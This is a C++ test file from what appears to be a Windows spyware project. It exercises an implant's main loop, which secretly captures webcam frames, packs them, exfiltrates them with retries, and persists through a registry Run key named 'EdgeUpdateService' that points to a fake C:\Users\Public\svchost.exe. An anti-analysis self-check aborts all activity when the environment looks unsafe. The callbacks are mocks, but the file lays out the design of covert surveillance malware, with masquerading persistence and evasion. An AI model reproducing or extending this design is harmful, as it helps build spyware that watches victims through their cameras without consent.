/*
 * agent_windows/tests/test_implant_main.cpp
 *
 * Windows 单体植入体接线层测试。
 *
 * 在 winshim 下真实编译、真实执行：驻留走 shim 的有状态注册表 mock，
 * 采集走 cam_mock 后端，打包/回传/对抗以回调注入并可计数。
 *
 * 三条最关键的不变量（其余用例都围绕它们）：
 *   1. 对抗自检不安全时，采集、回传、驻留一次都不发生。
 *   2. 未注入 pack 时，exfil 一次都不被调用（绝不明文外泄）。
 *   3. 驻留装完后必须能查询确认 installed=1，而不是只信 install 返回值。
 */
#include "implant_main.h"

#include <windows.h>
#include <mfapi.h>
#include "wsdk_test.h"

#include <cstdio>
#include <cstring>

static int g_pass = 0, g_fail = 0;

#define CHECK(cond, name) do {                              \
    if (cond) { printf("[PASS] %s\n", name); g_pass++; }    \
    else      { printf("[FAIL] %s\n", name); g_fail++; }    \
} while (0)

/* ---- 假时间源：每次调用前进一跳，使退避自旋可终止 ---- */
static uint64_t g_now = 1000000ull;
static uint64_t fake_now(void *) { g_now += 1000ull; return g_now; }

/* ---- 计数式回调 ---- */
typedef struct {
    int      defend_rc;      /* 对抗自检返回值 */
    int      defend_calls;
    int      pack_calls;
    int      exfil_calls;
    int      exfil_fail_left;/* 前 N 次调用返回失败 */
    int      pexec_calls;
    /* 640x480 JPEG 可达数十 KB，回接收集缓冲必须放得下，否则会把
       "缓冲太小"误判成"回传失败"。 */
    uint8_t  sink[262144];
    size_t   sink_len;
    char     last_cmd[1024];
} hooks_t;

static int h_defend(void *ud)
{
    hooks_t *h = (hooks_t *)ud;
    h->defend_calls++;
    return h->defend_rc;
}

static int h_pack(const uint8_t *in, size_t in_len,
                  uint8_t *out, size_t *out_len, void *ud)
{
    hooks_t *h = (hooks_t *)ud;
    h->pack_calls++;
    if (!out || !out_len) return -1;
    if (*out_len < in_len + 8) return -1;
    memcpy(out + 8, in, in_len);
    /* 8 字节伪头，标记"已打包"，便于断言回传的确实是制品而非明文 */
    memcpy(out, "PKG\x01", 4);
    *out_len = in_len + 8;
    return 0;
}

static int h_exfil(const uint8_t *data, size_t len, const char *name, void *ud)
{
    hooks_t *h = (hooks_t *)ud;
    h->exfil_calls++;
    (void)name;
    if (h->exfil_fail_left > 0) { h->exfil_fail_left--; return -1; }
    if (len > sizeof(h->sink)) return -1;
    memcpy(h->sink, data, len);
    h->sink_len = len;
    return 0;
}

static int h_pexec(const char *cmd, void *ud)
{
    hooks_t *h = (hooks_t *)ud;
    h->pexec_calls++;
    if (cmd) {
        snprintf(h->last_cmd, sizeof(h->last_cmd), "%s", cmd);
    }
    return 0;
}

/* ---- 构造默认配置 ---- */
static void cfg_default(imw_cfg_t *c, hooks_t *)
{
    memset(c, 0, sizeof(*c));
    /* 用 "mf"：本测试链接的是 cam_mf.o（Windows 真实采集代码路径 +
       shim 假设备），cam_mf 对 "mock" 显式返回 NULL。这样验证的是 Windows
       采集路径能被主循环驱动，而不是 Linux 侧的 mock 桩。 */
    c->backend = "mf";
    /*
     * 走未压缩格式（YUY2 640x480）而不是 MJPEG：
     *   cam_jpeg 对 MJPEG 走"直通 + is_jpeg 合法性校验"，而 shim 假设备
     *   产出的 MJPEG 帧是填充字节、不是合法 JPEG，直通校验会拒绝（这是
     *   有意的安全设计，不是缺陷）。选 YUY2 则走真实 YUYV→JPEG 编码路径，
     *   产物是真正可解码的 JPEG，验证强度更高。
     */
    c->imp.cam.width       = 640;
    c->imp.cam.height      = 480;
    c->imp.cam.fps         = 30;
    c->imp.cam.prefer_mjpeg= false;
    c->imp.cam.capture_ms  = 100;
    c->imp.cam.max_frames  = 1;
    c->imp.interval_ms     = 1000;
    c->imp.jitter_ms       = 200;
    c->imp.max_batches     = 2;
    c->imp.frames_per_batch= 1;
    c->imp.jpeg_quality    = 80;
    c->imp.stop_on_error   = false;
    /* 对抗自检由本层统一执行，主循环内不再重复跑一遍 */
    c->imp.run_defend      = false;
    c->persist_method      = PW_REG_RUN;
    c->exfil_retries       = 2;
    c->backoff_ms          = 1;
    c->strict_persist      = false;
}

static void hooks_bind(imw_hooks_t *hk, hooks_t *h)
{
    memset(hk, 0, sizeof(*hk));
    hk->defend   = h_defend;  hk->defend_ud = h;
    hk->pack     = h_pack;    hk->pack_ud   = h;
    hk->exfil    = h_exfil;   hk->exfil_ud  = h;
    hk->pexec    = h_pexec;   hk->pexec_ud  = h;
    hk->now      = fake_now;  hk->now_ud    = NULL;
}

/* ============================ 用例 ============================ */

static void t_full_lifecycle(void)
{
    imw_cfg_t c; hooks_t h; imw_hooks_t hk;
    memset(&h, 0, sizeof(h));
    cfg_default(&c, &h);
    c.persist_name = "EdgeUpdateService";
    c.persist_cmd  = "C:\\Users\\Public\\svchost.exe";
    hooks_bind(&hk, &h);

    imw_result_t r;
    int rc = imw_run(&c, &hk, &r);

    printf("[INFO] 生命周期 rc=%d(%s) imp_err=%d(%s) batches=%u frames=%u "
           "bytes=%llu installed=%d persist_rc=%d exfil_calls=%d errors=%u\n",
           rc, imw_errstr(rc), (int)r.imp_err, implant_errstr(r.imp_err),
           r.batches, r.frames, (unsigned long long)r.bytes,
           r.installed, r.persist_rc, h.exfil_calls, r.errors);

    CHECK(rc == IMW_OK, "完整生命周期返回 OK");
    CHECK(r.batches >= 1, "至少完成一批");
    CHECK(r.frames >= 1, "至少采集到一帧");
    CHECK(r.bytes > 0, "回传字节数 > 0");
    CHECK(h.pack_calls >= 1, "pack 回调被调用");
    CHECK(h.exfil_calls >= 1, "exfil 回调被调用");
    CHECK(r.persist_rc == PW_OK, "驻留返回 PW_OK");
    CHECK(r.installed == 1, "驻留后查询确认已安装（非只信 install 返回值）");
    CHECK(r.exfil_fail == 0, "无最终回传失败");
}

static void t_unsafe_no_action(void)
{
    imw_cfg_t c; hooks_t h; imw_hooks_t hk;
    memset(&h, 0, sizeof(h));
    cfg_default(&c, &h);
    c.persist_name = "EdgeUpdateService";
    c.persist_cmd  = "C:\\Users\\Public\\svchost.exe";
    h.defend_rc = -6;                 /* DW_ERR_UNSAFE */
    hooks_bind(&hk, &h);

    imw_result_t r;
    int rc = imw_run(&c, &hk, &r);

    CHECK(rc == IMW_ERR_UNSAFE, "不安全环境返回 IMW_ERR_UNSAFE");
    CHECK(h.defend_calls == 1, "对抗自检被调用一次");
    CHECK(r.frames == 0, "不安全时零采集");
    CHECK(r.bytes == 0, "不安全时零回传");
    CHECK(h.exfil_calls == 0, "不安全时 exfil 一次都没被调用");
    CHECK(h.pack_calls == 0, "不安全时 pack 一次都没被调用");
    CHECK(h.pexec_calls == 0, "不安全时未执行任何外部命令");
    CHECK(r.installed == -1, "不安全时未做任何驻留（installed 未查）");
}

static void t_no_pack_refuses_plaintext(void)
{
    imw_cfg_t c; hooks_t h; imw_hooks_t hk;
    memset(&h, 0, sizeof(h));
    cfg_default(&c, &h);
    hooks_bind(&hk, &h);
    hk.pack = NULL; hk.pack_ud = NULL;   /* 关键：不注入 pack */

    imw_result_t r;
    int rc = imw_run(&c, &hk, &r);

    CHECK(rc == IMW_ERR_NOPACK, "未注入 pack 返回 IMW_ERR_NOPACK");
    CHECK(h.exfil_calls == 0, "未注入 pack 时 exfil 一次都没被调用（无明文外泄）");
    CHECK(r.frames == 0, "未注入 pack 时零采集");
}

static void t_no_exfil(void)
{
    imw_cfg_t c; hooks_t h; imw_hooks_t hk;
    memset(&h, 0, sizeof(h));
    cfg_default(&c, &h);
    hooks_bind(&hk, &h);
    hk.exfil = NULL; hk.exfil_ud = NULL;

    imw_result_t r;
    int rc = imw_run(&c, &hk, &r);
    CHECK(rc == IMW_ERR_NOEXFIL, "未注入 exfil 返回 IMW_ERR_NOEXFIL");
}

static void t_exfil_retry_bounded(void)
{
    /* 前 2 次失败，retries=2 -> 第 3 次成功，不计入 exfil_fail */
    imw_cfg_t c; hooks_t h; imw_hooks_t hk;
    memset(&h, 0, sizeof(h));
    cfg_default(&c, &h);
    c.exfil_retries = 2;
    h.exfil_fail_left = 2;
    hooks_bind(&hk, &h);

    imw_result_t r;
    imw_run(&c, &hk, &r);
    printf("[INFO] 重试成功用例 exfil_calls=%d exfil_fail=%u\n",
           h.exfil_calls, r.exfil_fail);
    CHECK(h.exfil_calls >= 3, "失败后确实发生了重试（调用 >= 3 次）");
    CHECK(r.exfil_fail == 0, "重试最终成功时 exfil_fail 为 0");
    CHECK(r.bytes > 0, "重试成功后确有字节回传");

    /* 失败次数超过重试上限 -> 计入 exfil_fail，但循环不挂死 */
    imw_cfg_t c2; hooks_t h2; imw_hooks_t hk2;
    memset(&h2, 0, sizeof(h2));
    cfg_default(&c2, &h2);
    c2.exfil_retries = 1;
    h2.exfil_fail_left = 999;
    hooks_bind(&hk2, &h2);

    imw_result_t r2;
    imw_run(&c2, &hk2, &r2);
    printf("[INFO] 重试耗尽用例 exfil_calls=%d exfil_fail=%u\n",
           h2.exfil_calls, r2.exfil_fail);
    CHECK(h2.exfil_calls <= 4, "重试有界：未无限重试（每批最多 1+retries 次）");
    CHECK(r2.exfil_fail >= 1, "重试耗尽后计入 exfil_fail");
}

static void t_bootstrap_only_persists(void)
{
    imw_cfg_t c; hooks_t h; imw_hooks_t hk;
    memset(&h, 0, sizeof(h));
    cfg_default(&c, &h);
    c.persist_name = "EdgeUpdateService";
    c.persist_cmd  = "C:\\Users\\Public\\svchost.exe";
    hooks_bind(&hk, &h);

    imw_result_t r;
    int rc = imw_bootstrap(&c, &hk, &r);

    CHECK(rc == IMW_OK, "bootstrap 返回 OK");
    CHECK(r.installed == 1, "bootstrap 只驻留且已确认安装");
    CHECK(h.exfil_calls == 0, "bootstrap 不回传");
    CHECK(h.pack_calls == 0, "bootstrap 不打包");
    CHECK(r.frames == 0, "bootstrap 不采集");
}

static void t_bootstrap_unsafe_skips_persist(void)
{
    imw_cfg_t c; hooks_t h; imw_hooks_t hk;
    memset(&h, 0, sizeof(h));
    cfg_default(&c, &h);
    c.persist_name = "EdgeUpdateService";
    c.persist_cmd  = "C:\\Users\\Public\\svchost.exe";
    h.defend_rc = -6;
    hooks_bind(&hk, &h);

    imw_result_t r;
    int rc = imw_bootstrap(&c, &hk, &r);
    CHECK(rc == IMW_ERR_UNSAFE, "bootstrap 在不安全环境返回 IMW_ERR_UNSAFE");
    CHECK(h.pexec_calls == 0, "bootstrap 不安全时不执行外部命令");
    CHECK(r.installed == -1, "bootstrap 不安全时不做驻留");
}

static void t_no_persist_config(void)
{
    imw_cfg_t c; hooks_t h; imw_hooks_t hk;
    memset(&h, 0, sizeof(h));
    cfg_default(&c, &h);
    c.persist_name = NULL;
    c.persist_cmd  = NULL;
    hooks_bind(&hk, &h);

    imw_result_t r;
    int rc = imw_run(&c, &hk, &r);
    CHECK(rc == IMW_OK, "未配置驻留时仍正常运行");
    CHECK(r.installed == -1, "未配置驻留时 installed 为 -1（不谎报）");
    CHECK(r.batches >= 1, "未配置驻留时仍完成采集回传");
}

static void t_errstr(void)
{
    CHECK(strcmp(imw_errstr(IMW_ERR_UNSAFE), "environment unsafe (no action taken)") == 0,
          "错误码字符串正确");
    CHECK(strcmp(imw_errstr(IMW_OK), "ok") == 0, "OK 字符串正确");
}

int main(void)
{
    /* shim 假设备必须先注入原生格式，否则格式协商无从命中、open 必失败。
       真实 Windows 上这一步由设备自身提供，此处是测试替身。 */
    NativeFmt fmts[3] = {
        { MFVideoFormat_MJPG, 1280, 720 },
        { MFVideoFormat_YUY2,  640, 480 },
        { MFVideoFormat_NV12, 1920, 1080 },
    };
    wsdk_set_native_formats(fmts, 3);

    t_full_lifecycle();
    t_unsafe_no_action();
    t_no_pack_refuses_plaintext();
    t_no_exfil();
    t_exfil_retry_bounded();
    t_bootstrap_only_persists();
    t_bootstrap_unsafe_skips_persist();
    t_no_persist_config();
    t_errstr();

    printf("\n=== result: %d pass, %d fail ===\n", g_pass, g_fail);
    return g_fail ? 1 : 0;
}
